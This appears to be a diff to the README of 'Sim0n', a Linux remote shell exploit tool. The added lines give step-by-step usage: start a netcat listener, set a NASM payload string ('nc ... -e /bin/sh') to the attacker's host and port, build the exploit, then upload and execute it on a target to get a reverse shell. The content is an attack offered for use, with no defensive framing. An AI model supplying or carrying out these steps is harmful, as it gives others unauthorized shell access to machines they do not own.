@@ -8,10 +8,16 @@ Sim0n is a Linux remote shell exploit that exploits memory vulnerabilities via s
 
 **1** Start the listener on your computer
 
-```
+```shell
 nc -lvp 4444
 ```
 
-**2.** Modify this string of payload
+**2.** Modify this string of payload change it to your host and port
 
-https://github.com/enty8080/sim0n/blob/0367c93413a0dba5829f4ee1b2843b7ca1b68fb6/payload.nasm#L55
+```nasm
+cmd: db         "nc 127.0.0.1 4444 -e /bin/sh"
+```
+
+**3.** Run `make all`
+
+**4.** Upload `exploit` file to target and execute
